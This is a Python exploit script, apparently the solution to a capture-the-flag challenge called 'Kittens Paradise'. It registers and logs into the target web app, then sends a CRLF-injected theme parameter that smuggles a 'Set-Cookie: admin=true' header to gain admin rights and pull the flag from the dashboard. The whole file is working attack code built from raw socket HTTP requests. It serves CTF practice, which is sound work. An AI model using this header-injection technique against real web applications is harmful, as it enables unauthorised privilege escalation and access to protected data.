#!/usr/bin/env python3
"""
KITTENS PARADISE — Exploit
1. Register  2. Login  3. CRLF via theme pipe suffix  4. Get flag from dashboard
"""
import sys, socket, re

HOST, PORT = "localhost", 3000
if len(sys.argv) > 1:
    url = sys.argv[1].replace("http://","").replace("https://","").rstrip("/")
    if ":" in url: HOST, PORT = url.rsplit(":",1); PORT = int(PORT)
    else: HOST = url

def raw(method, path, headers=None, body=None):
    s = socket.socket(); s.connect((HOST, PORT))
    r = f"{method} {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
    for k,v in (headers or {}).items(): r += f"{k}: {v}\r\n"
    if body: r += f"Content-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
    r += "Connection: close\r\n\r\n"
    if body: r += body
    s.sendall(r.encode()); d = b""
    while True:
        c = s.recv(4096)
        if not c: break
        d += c
    s.close(); return d.decode(errors="replace")

def get_cookie(resp, name):
    m = re.search(rf"Set-Cookie:\s*{name}=([^;\s\r\n]+)", resp)
    return m.group(1) if m else None

print(f"[*] Target: {HOST}:{PORT}")

print("[1] Register...")
raw("POST", "/register", body="username=xploit&password=xploit123")

print("[2] Login...")
r = raw("POST", "/login", body="username=xploit&password=xploit123")
sid = get_cookie(r, "session"); tok = get_cookie(r, "token")
print(f"    session={sid[:16]}...")

print("[3] CRLF injection: dark|x\\r\\nSet-Cookie: admin=true")
raw("GET", "/?theme=dark|x%0d%0aSet-Cookie:%20admin=true", {"Cookie": f"session={sid}; token={tok}"})

print("[4] Dashboard...")
r = raw("GET", "/dashboard", {"Cookie": f"session={sid}; token={tok}"})
flags = re.findall(r"ictf\{[^}]+\}", r)
if flags: print(f"\n[+] FLAG: {flags[0]}")
else: print("[!] Flag not found"); print(r[:500])
